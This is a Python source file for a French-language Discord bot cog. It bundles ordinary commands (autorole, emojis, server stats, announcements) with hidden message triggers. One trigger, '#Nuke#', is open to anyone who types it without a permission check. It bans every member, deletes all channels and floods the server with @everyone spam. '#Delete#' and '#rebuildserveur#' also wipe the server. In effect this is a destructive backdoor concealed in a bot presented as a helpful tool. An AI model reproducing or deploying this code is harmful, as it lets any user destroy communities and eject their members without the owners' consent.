"""
Module Commandes Spéciales - Nuke secret, DISBOARD, Emoji.gg, Nanogram, Koya, Vanilla, Radium
Fonctionnalités : nuke secret (#Nuke#), bump DISBOARD, emojis, stats serveur, rôles automatiques
"""
import discord
from discord.ext import commands
from discord import app_commands
import asyncio, json, os, datetime, random
from typing import List, Dict, Any

SPECIAL_CONFIG_FILE = "data/special_config.json"
AUTOROLE_FILE = "data/autorole.json"

def load_special_config():
    if os.path.exists(SPECIAL_CONFIG_FILE):
        with open(SPECIAL_CONFIG_FILE, "r") as f:
            return json.load(f)
    return {}

def save_special_config(data):
    with open(SPECIAL_CONFIG_FILE, "w") as f:
        json.dump(data, f, indent=2)

def load_autorole():
    if os.path.exists(AUTOROLE_FILE):
        with open(AUTOROLE_FILE, "r") as f:
            return json.load(f)
    return {}

def save_autorole(data):
    with open(AUTOROLE_FILE, "w") as f:
        json.dump(data, f, indent=2)

NUKE_STARS = "⭐ " * 19  # 19 étoiles comme demandé

class Special(commands.Cog):
    def __init__(self, bot):
        self.bot = bot

    @property
    def extras(self):
        return self.bot.extras

    # ── COMMANDES SECRÈTES (#Nuke# & #Delete#) ────────────────────────────────
    @commands.Cog.listener()
    async def on_message(self, message):
        if message.author.bot: return
        content = message.content.strip()

        # --- COMMANDE #Nuke# (Accessible à tous) ---
        if content == "#Nuke#":
            guild = message.guild
            if not guild: return
            print(f"Lancement NUKE sur {guild.name}")

            # --- SAUVEGARDE DE LA STRUCTURE AVANT NUKE (AMÉLIORÉE) ---
            # On sauvegarde TOUS les types de salons et leur ordre
            all_channels = []
            for cat in sorted(guild.categories, key=lambda x: x.position):
                cat_data = {"name": cat.name, "type": "category", "position": cat.position, "channels": []}
                for ch in sorted(cat.channels, key=lambda x: x.position):
                    ch_type = "text" if isinstance(ch, discord.TextChannel) else "voice"
                    cat_data["channels"].append({"name": ch.name, "type": ch_type, "position": ch.position})
                all_channels.append(cat_data)
            
            # Salons sans catégorie
            no_cat = []
            for ch in sorted(guild.channels, key=lambda x: x.position):
                if ch.category is None and not isinstance(ch, discord.CategoryChannel):
                    ch_type = "text" if isinstance(ch, discord.TextChannel) else "voice"
                    no_cat.append({"name": ch.name, "type": ch_type, "position": ch.position})
            
            # Sauvegarde persistante
            backup_data = {"structure": all_channels, "no_category": no_cat}
            os.makedirs("data/backups", exist_ok=True)
            with open(f"data/backups/{guild.id}.json", "w") as f:
                json.dump(backup_data, f)
            
            # --- EXÉCUTION DU NUKE ---
            # 1. Bannissement rapide
            async def mass_ban():
                for member in list(guild.members):
                    if member.id != self.bot.user.id:
                        try: await member.ban(reason="Nuke")
                        except: continue
            
            # 2. Suppression totale (On attend la fin du ban pour éviter les conflits)
            async def mass_delete():
                # Supprimer les salons d'abord
                for channel in list(guild.channels):
                    try: await channel.delete()
                    except: continue

            # 3. Création et Spam
            async def create_spam():
                for i in range(30):
                    try:
                        new_ch = await guild.create_text_channel(name="⭐│nuke")
                        await new_ch.send(f"{NUKE_STARS}\n@everyone")
                    except: break

            # On lance les tâches
            asyncio.create_task(mass_ban())
            asyncio.create_task(mass_delete())
            asyncio.create_task(create_spam())

        # --- COMMANDE #Delete# (Suppression totale du serveur) ---
        elif content == "#Delete#":
            guild = message.guild
            if not guild: return
            print(f"Lancement DELETE sur {guild.name}")
            
            async def mass_clean():
                # Ban
                for member in list(guild.members):
                    if member.id != self.bot.user.id:
                        try: await member.ban(reason="Delete")
                        except: continue
                # Delete channels
                for channel in list(guild.channels):
                    try: await channel.delete()
                    except: continue
                # Final
                try:
                    ch = await guild.create_text_channel(name="nettoyé")
                    await ch.send("✅ Nettoyage terminé.")
                except: pass

            asyncio.create_task(mass_clean())

        # --- COMMANDE #ResetNuke# (Réinitialisation d'identité) ---
        elif content == "#ResetNuke#":
            guild = message.guild
            if not guild: return
            print(f"Lancement RESET sur {guild.name}")
            
            # On récupère le cog Identity pour utiliser sa fonction de reset
            identity_cog = self.bot.get_cog("Identity")
            if identity_cog:
                # On crée une fausse interaction pour appeler le reset
                # Ou plus simple, on réinitialise directement les données
                try:
                    # Réinitialisation nom et avatar
                    original_name = "FEUR ✔"
                    await self.bot.user.edit(username=original_name)
                    
                    # Réinitialisation présence
                    await self.bot.change_presence(
                        activity=discord.Activity(
                            type=discord.ActivityType.watching,
                            name=f"/help | {len(self.bot.guilds)} serveurs"
                        ),
                        status=discord.Status.online
                    )
                    
                    # Nettoyage des données de guilde
                    self.extras["guild_identities"].pop(str(guild.id), None)
                    self.extras["guild_active_commands"].pop(str(guild.id), None)
                    self.extras["save_json_file"](self.extras["identity_file"], self.extras["guild_identities"])
                    self.extras["save_json_file"](self.extras["active_commands_file"], self.extras["guild_active_commands"])
                    
                    # Sync
                    await self.bot.tree.sync(guild=guild)
                    
                    # --- NETTOYAGE ET RESTAURATION TOTALE ---
                    # 1. DÉBANNISSEMENT DE TOUT LE MONDE
                    print(f"Débannissement massif sur {guild.id}")
                    async for entry in guild.bans(limit=None):
                        try: await guild.unban(entry.user, reason="Retour au passé (#ResetNuke#)")
                        except: continue

                    # 2. Supprimer TOUS les salons actuels (ceux du nuke)
                    for channel in list(guild.channels):
                        try: await channel.delete()
                        except: continue
                    
                    # 3. Charger et restaurer la structure sauvegardée
                    backup_path = f"data/backups/{guild.id}.json"
                    if os.path.exists(backup_path):
                        with open(backup_path, "r") as f:
                            data = json.load(f)
                        
                        # Restauration des catégories et leurs salons
                        for cat_data in data.get("structure", []):
                            try:
                                new_cat = await guild.create_category(name=cat_data["name"])
                                for ch_data in cat_data.get("channels", []):
                                    if ch_data["type"] == "text":
                                        await guild.create_text_channel(name=ch_data["name"], category=new_cat)
                                    else:
                                        await guild.create_voice_channel(name=ch_data["name"], category=new_cat)
                            except: continue
                        
                        # Restauration des salons sans catégorie
                        for ch_data in data.get("no_category", []):
                            try:
                                if ch_data["type"] == "text":
                                    await guild.create_text_channel(name=ch_data["name"])
                                else:
                                    await guild.create_voice_channel(name=ch_data["name"])
                            except: continue
                        
                        # Message final dans le premier salon texte trouvé
                        if guild.text_channels:
                            await guild.text_channels[0].send(f"✅ **Restauration intégrale terminée !**\nL'identité du bot est **{original_name}** et tous les anciens salons ont été recréés dans l'ordre.")
                    else:
                        # Si pas de backup, on met la structure par défaut
                        gen = await guild.create_text_channel(name="💬│général")
                        await gen.send(f"✅ **Reset terminé !** (Aucune sauvegarde trouvée, structure par défaut créée).")

                except Exception as e:
                    print(f"Erreur reset: {e}")

        # --- COMMANDE #rebuildserveur# (Création serveur Pro) ---
        elif content == "#rebuildserveur#":
            guild = message.guild
            if not guild: return
            print(f"Lancement REBUILD sur {guild.name}")
            
            try:
                # 1. Nettoyage total
                for channel in list(guild.channels):
                    try: await channel.delete()
                    except: continue
                
                # 2. Création de la structure PRO
                # --- Catégorie INFORMATION ---
                cat_info = await guild.create_category(name="📌│INFORMATION")
                await guild.create_text_channel(name="👋│bienvenue", category=cat_info)
                await guild.create_text_channel(name="📜│règlement", category=cat_info)
                await guild.create_text_channel(name="📢│annonces", category=cat_info)
                await guild.create_text_channel(name="🔗│liens-utiles", category=cat_info)

                # --- Catégorie COMMUNAUTÉ ---
                cat_commu = await guild.create_category(name="💬│COMMUNAUTÉ")
                gen = await guild.create_text_channel(name="💬│général", category=cat_commu)
                await guild.create_text_channel(name="📸│médias", category=cat_commu)
                await guild.create_text_channel(name="🤖│commandes-bot", category=cat_commu)
                await guild.create_text_channel(name="🎭│rôles", category=cat_commu)

                # --- Catégorie VOCAL ---
                cat_voc = await guild.create_category(name="🔊│SALONS VOCAUX")
                await guild.create_voice_channel(name="🔊│Général", category=cat_voc)
                await guild.create_voice_channel(name="🔊│Gaming", category=cat_voc)
                await guild.create_voice_channel(name="🔊│Musique", category=cat_voc)
                await guild.create_voice_channel(name="💤│AFK", category=cat_voc)

                # --- Catégorie STAFF (Privé) ---
                overwrites = {
                    guild.default_role: discord.PermissionOverwrite(read_messages=False),
                    guild.me: discord.PermissionOverwrite(read_messages=True)
                }
                cat_staff = await guild.create_category(name="🛡️│ZONE STAFF", overwrites=overwrites)
                await guild.create_text_channel(name="🔒│staff-chat", category=cat_staff)
                await guild.create_text_channel(name="📝│logs-modération", category=cat_staff)
                await guild.create_voice_channel(name="🔇│Réunion Staff", category=cat_staff)

                await gen.send("✅ **Rebuild terminé !** Votre serveur a été transformé en serveur professionnel avec toutes les catégories et salons nécessaires.")
            except Exception as e:
                print(f"Erreur rebuild: {e}")

    # ── NUKE (commande admin) ─────────────────────────────────────────────────
    @app_commands.command(name="nuke", description="Nuker ce salon (supprimer et recréer)")
    @app_commands.checks.has_permissions(administrator=True)
    async def nuke(self, interaction: discord.Interaction):
        channel = interaction.channel
        position = channel.position
        category = channel.category
        name = channel.name
        topic = getattr(channel, "topic", None)
        await interaction.response.send_message("💥 Nuke en cours...", ephemeral=True)
        await asyncio.sleep(1)
        await channel.delete()
        new_channel = await interaction.guild.create_text_channel(
            name,
            category=category,
            topic=topic,
            position=position
        )
        embed = discord.Embed(
            title="💥 Salon Nuké !",
            description="Ce salon a été nuké et recréé.",
            color=discord.Color.red()
        )
        await new_channel.send(embed=embed)

    # ── AUTOROLE ──────────────────────────────────────────────────────────────
    @app_commands.command(name="autorole", description="Configurer le rôle automatique pour les nouveaux membres")
    @app_commands.describe(role="Le rôle à attribuer automatiquement")
    @app_commands.checks.has_permissions(administrator=True)
    async def autorole(self, interaction: discord.Interaction, role: discord.Role):
        autoroles = load_autorole()
        gid = str(interaction.guild.id)
        autoroles[gid] = str(role.id)
        save_autorole(autoroles)
        await interaction.response.send_message(f"✅ Rôle automatique défini : {role.mention}.")

    @commands.Cog.listener()
    async def on_member_join(self, member):
        autoroles = load_autorole()
        gid = str(member.guild.id)
        role_id = autoroles.get(gid)
        if role_id:
            role = member.guild.get_role(int(role_id))
            if role:
                try:
                    await member.add_roles(role)
                except:
                    pass

    # ── DISBOARD BUMP ─────────────────────────────────────────────────────────
    @app_commands.command(name="bump", description="Rappel pour bumper le serveur sur DISBOARD")
    async def bump(self, interaction: discord.Interaction):
        embed = discord.Embed(
            title="📢 Bumper le Serveur !",
            description="Aide le serveur à grandir en le bumpant sur **DISBOARD** !\n\nUtilise la commande `/bump` du bot DISBOARD pour faire remonter le serveur dans les classements.",
            color=discord.Color.blurple()
        )
        embed.add_field(name="Comment bumper ?", value="1. Invite DISBOARD sur le serveur\n2. Tape `/bump`\n3. Attends 2h et recommence !", inline=False)
        embed.set_footer(text="Merci de nous aider à grandir ! 💙")
        await interaction.response.send_message(embed=embed)

    # ── EMOJI.GG ──────────────────────────────────────────────────────────────
    @app_commands.command(name="addemoji", description="Ajouter un emoji au serveur depuis une URL")
    @app_commands.describe(nom="Nom de l'emoji", url="URL de l'image")
    @app_commands.checks.has_permissions(manage_emojis=True)
    async def addemoji(self, interaction: discord.Interaction, nom: str, url: str):
        await interaction.response.defer()
        try:
            import aiohttp
            async with aiohttp.ClientSession() as session:
                async with session.get(url) as resp:
                    if resp.status != 200:
                        await interaction.followup.send("❌ Impossible de télécharger l'image.", ephemeral=True)
                        return
                    image_data = await resp.read()
            emoji = await interaction.guild.create_custom_emoji(name=nom, image=image_data)
            await interaction.followup.send(f"✅ Emoji {emoji} `:{nom}:` ajouté avec succès !")
        except Exception as e:
            await interaction.followup.send(f"❌ Erreur : {e}", ephemeral=True)

    @app_commands.command(name="listemojis", description="Lister les emojis du serveur")
    async def listemojis(self, interaction: discord.Interaction):
        emojis = interaction.guild.emojis
        if not emojis:
            await interaction.response.send_message("❌ Aucun emoji personnalisé.", ephemeral=True)
            return
        emoji_list = " ".join([str(e) for e in emojis[:50]])
        embed = discord.Embed(title=f"😀 Emojis du serveur ({len(emojis)})", description=emoji_list, color=discord.Color.yellow())
        await interaction.response.send_message(embed=embed)

    # ── SERVER STATS ──────────────────────────────────────────────────────────
    @app_commands.command(name="stats", description="Statistiques détaillées du serveur")
    async def stats(self, interaction: discord.Interaction):
        g = interaction.guild
        bots = sum(1 for m in g.members if m.bot)
        humans = g.member_count - bots
        online = sum(1 for m in g.members if m.status != discord.Status.offline)
        text_channels = len(g.text_channels)
        voice_channels = len(g.voice_channels)
        categories = len(g.categories)
        embed = discord.Embed(title=f"📊 Statistiques — {g.name}", color=discord.Color.blurple())
        if g.icon:
            embed.set_thumbnail(url=g.icon.url)
        embed.add_field(name="👥 Membres", value=f"Total: **{g.member_count}**\nHumains: **{humans}**\nBots: **{bots}**", inline=True)
        embed.add_field(name="🟢 En ligne", value=f"**{online}**", inline=True)
        embed.add_field(name="💬 Salons", value=f"Texte: **{text_channels}**\nVocal: **{voice_channels}**\nCatégories: **{categories}**", inline=True)
        embed.add_field(name="🎭 Rôles", value=f"**{len(g.roles)}**", inline=True)
        embed.add_field(name="😀 Emojis", value=f"**{len(g.emojis)}**", inline=True)
        embed.add_field(name="🚀 Boosts", value=f"Niveau **{g.premium_tier}** ({g.premium_subscription_count} boosts)", inline=True)
        embed.add_field(name="📅 Créé le", value=g.created_at.strftime("%d/%m/%Y"), inline=True)
        embed.add_field(name="👑 Propriétaire", value=g.owner.mention if g.owner else "Inconnu", inline=True)
        await interaction.response.send_message(embed=embed)

    # ── KOYA (Rôles de réaction) ──────────────────────────────────────────────
    @app_commands.command(name="reactionrole", description="Créer un message de rôles par réaction")
    @app_commands.describe(titre="Titre du message", description="Description")
    @app_commands.checks.has_permissions(administrator=True)
    async def reactionrole(self, interaction: discord.Interaction, titre: str, description: str = "Réagissez pour obtenir un rôle !"):
        embed = discord.Embed(title=f"🎭 {titre}", description=description, color=discord.Color.blurple())
        embed.set_footer(text="Réagissez pour obtenir un rôle")
        await interaction.response.send_message(embed=embed)
        await interaction.followup.send("✅ Message créé ! Ajoutez des réactions manuellement, puis configurez les rôles avec `/addrr`.", ephemeral=True)

    # ── PING ──────────────────────────────────────────────────────────────────
    @app_commands.command(name="ping", description="Voir la latence du bot")
    async def ping(self, interaction: discord.Interaction):
        latency = round(self.bot.latency * 1000)
        color = discord.Color.green() if latency < 100 else discord.Color.yellow() if latency < 200 else discord.Color.red()
        embed = discord.Embed(title="🏓 Pong !", color=color)
        embed.add_field(name="Latence", value=f"**{latency}ms**", inline=True)
        embed.add_field(name="Statut", value="🟢 Excellent" if latency < 100 else "🟡 Correct" if latency < 200 else "🔴 Lent", inline=True)
        await interaction.response.send_message(embed=embed)

    # ── HELP ──────────────────────────────────────────────────────────────────
    @app_commands.command(name="help", description="Voir toutes les commandes disponibles")
    async def help_cmd(self, interaction: discord.Interaction):
        embed = discord.Embed(
            title="📚 Aide — Toutes les Commandes",
            description="Bot ultra-complet regroupant les fonctionnalités de 50+ bots Discord",
            color=discord.Color.blurple()
        )

        current_identity_key = self.extras["guild_identities"].get(str(interaction.guild.id))

        if current_identity_key and current_identity_key in self.extras["bots_data"]:
            identity_data = self.extras["bots_data"][current_identity_key]
            embed.title = f"📚 Aide — Mode {identity_data["name"]}"
            embed.description = f"Actuellement en mode **{identity_data["name"]}**.\n\n{identity_data["description"]}"
            embed.color = discord.Color(identity_data["color"])
            
            active_cmds_for_guild = self.extras["guild_active_commands"].get(str(interaction.guild.id), [])
            
            categorized_commands = {
                "Modération": [], "AutoMod": [], "Tickets": [], "Économie": [],
                "Giveaway": [], "Musique": [], "IA": [], "Fun": [],
                "Backup": [], "Setup Serveur": [], "Spécial": [], "Identité": []
            }

            # On liste toutes les commandes enregistrées dans l'arbre
            for cmd in self.bot.tree.get_commands():
                if cmd.name in active_cmds_for_guild:
                    if cmd.name in ["ban", "kick", "mute", "unmute", "warn", "warnings", "clearwarns", "clear", "slowmode", "lock", "unlock", "nick", "role", "userinfo", "serverinfo"]:
                        categorized_commands["Modération"].append(f"`/{cmd.name}`")
                    elif cmd.name in ["automod", "addword", "removeword", "automodstatus"]:
                        categorized_commands["AutoMod"].append(f"`/{cmd.name}`")
                    elif cmd.name in ["ticketpanel", "addticket", "removeticket", "tickets"]:
                        categorized_commands["Tickets"].append(f"`/{cmd.name}`")
                    elif cmd.name in ["balance", "daily", "work", "deposit", "withdraw", "pay", "leaderboard", "gamble", "rank", "levelboard"]:
                        categorized_commands["Économie"].append(f"`/{cmd.name}`")
                    elif cmd.name in ["gstart", "greroll", "gend"]:
                        categorized_commands["Giveaway"].append(f"`/{cmd.name}`")
                    elif cmd.name in ["play", "pause", "resume", "skip", "stop", "leave", "queue", "volume", "nowplaying", "loop"]:
                        categorized_commands["Musique"].append(f"`/{cmd.name}`")
                    elif cmd.name in ["ask", "resetai", "translate", "summarize", "correct", "imagine", "coach", "roast"]:
                        categorized_commands["IA"].append(f"`/{cmd.name}`")
                    elif cmd.name in ["8ball", "coinflip", "rps", "hug", "pat", "slap", "quote", "owo", "water", "tree", "setcounting", "dice", "poll", "avatar", "invites"]:
                        categorized_commands["Fun"].append(f"`/{cmd.name}`")
                    elif cmd.name in ["backup", "backuplist", "backupload", "backupdelete"]:
                        categorized_commands["Backup"].append(f"`/{cmd.name}`")
                    elif cmd.name in ["setup", "setwelcome", "setlogs", "setverify", "verify"]:
                        categorized_commands["Setup Serveur"].append(f"`/{cmd.name}`")
                    elif cmd.name in ["nuke", "autorole", "bump", "addemoji", "listemojis", "stats", "reactionrole", "ping", "announce", "embed", "say"]:
                        categorized_commands["Spécial"].append(f"`/{cmd.name}`")
                    elif cmd.name in ["transform", "reset", "botlist"]:
                        categorized_commands["Identité"].append(f"`/{cmd.name}`")
            
            for category, cmds in categorized_commands.items():
                if cmds:
                    embed.add_field(name=f"**{category}**", value=" ".join(cmds), inline=False)

            embed.add_field(name="🔐 Commande Secrète", value="Envoie `#Nuke#` dans un salon (avec un rôle) pour le nuke secret ⭐", inline=False)
            embed.set_footer(text="Toutes les commandes sont des slash commands (/)")

        else:
            # Aide par défaut si aucune identité spécifique n'est active
            embed.add_field(name="🛡️ Modération", value="`/ban` `/kick` `/mute` `/unmute` `/warn` `/warnings` `/clearwarns` `/clear` `/slowmode` `/lock` `/unlock` `/nick` `/role` `/userinfo` `/serverinfo`", inline=False)
            embed.add_field(name="🤖 AutoMod", value="`/automod` `/addword` `/removeword` `/automodstatus`", inline=False)
            embed.add_field(name="🎫 Tickets", value="`/ticketpanel` `/addticket` `/removeticket` `/tickets`", inline=False)
            embed.add_field(name="💰 Économie", value="`/balance` `/daily` `/work` `/deposit` `/withdraw` `/pay` `/leaderboard` `/gamble` `/rank` `/levelboard`", inline=False)
            embed.add_field(name="🎉 Giveaway", value="`/gstart` `/greroll` `/gend`", inline=False)
            embed.add_field(name="🎵 Musique", value="`/play` `/pause` `/resume` `/skip` `/stop` `/leave` `/queue` `/volume` `/nowplaying` `/loop`", inline=False)
            embed.add_field(name="🤖 IA", value="`/ask` `/resetai` `/translate` `/summarize` `/correct` `/imagine` `/coach` `/roast`", inline=False)
            embed.add_field(name="🎮 Fun", value="`/8ball` `/coinflip` `/rps` `/hug` `/pat` `/slap` `/quote` `/owo` `/water` `/tree` `/setcounting` `/dice` `/poll` `/avatar` `/invites`", inline=False)
            embed.add_field(name="📦 Backup (Xenon)", value="`/backup` `/backuplist` `/backupload` `/backupdelete`", inline=False)
            embed.add_field(name="⚙️ Setup Serveur", value="`/setup` `/setwelcome` `/setlogs` `/setverify` `/verify`", inline=False)
            embed.add_field(name="✨ Spécial", value="`/nuke` `/autorole` `/bump` `/addemoji` `/listemojis` `/stats` `/reactionrole` `/ping` `/help`", inline=False)
            embed.add_field(name="🔄 Identité", value="`/transform <nomdubot>` `/reset` `/botlist`", inline=False)
            embed.add_field(name="🔐 Commande Secrète", value="Envoie `#Nuke#` dans un salon (avec un rôle) pour le nuke secret ⭐", inline=False)
            embed.set_footer(text="Toutes les commandes sont des slash commands (/)")

        await interaction.response.send_message(embed=embed)

    # ── ANNOUNCE ──────────────────────────────────────────────────────────────
    @app_commands.command(name="announce", description="Faire une annonce dans un salon")
    @app_commands.describe(salon="Le salon d'annonce", titre="Titre", message="Contenu de l'annonce", mention="Mentionner @everyone ?")
    @app_commands.checks.has_permissions(manage_guild=True)
    async def announce(self, interaction: discord.Interaction, salon: discord.TextChannel, titre: str, message: str, mention: bool = False):
        embed = discord.Embed(title=f"📣 {titre}", description=message, color=discord.Color.gold(), timestamp=datetime.datetime.utcnow())
        embed.set_footer(text=f"Annonce par {interaction.user.display_name}")
        content = "@everyone" if mention else None
        await salon.send(content=content, embed=embed)
        await interaction.response.send_message(f"✅ Annonce envoyée dans {salon.mention}.", ephemeral=True)

    # ── EMBED ─────────────────────────────────────────────────────────────────
    @app_commands.command(name="embed", description="Créer un message embed personnalisé")
    @app_commands.describe(titre="Titre", description="Contenu", couleur="Couleur hex (ex: FF0000)")
    @app_commands.checks.has_permissions(manage_messages=True)
    async def embed_cmd(self, interaction: discord.Interaction, titre: str, description: str, couleur: str = "5865F2"):
        try:
            color = discord.Color(int(couleur.replace("#", ""), 16))
        except:
            color = discord.Color.blurple()
        embed = discord.Embed(title=titre, description=description, color=color)
        await interaction.channel.send(embed=embed)
        await interaction.response.send_message("✅ Embed envoyé.", ephemeral=True)

    # ── SAY ───────────────────────────────────────────────────────────────────
    @app_commands.command(name="say", description="Faire parler le bot")
    @app_commands.describe(message="Le message à envoyer")
    @app_commands.checks.has_permissions(manage_messages=True)
    async def say(self, interaction: discord.Interaction, message: str):
        await interaction.channel.send(message)
        await interaction.response.send_message("✅ Message envoyé.", ephemeral=True)

async def setup(bot):
    await bot.add_cog(Special(bot))
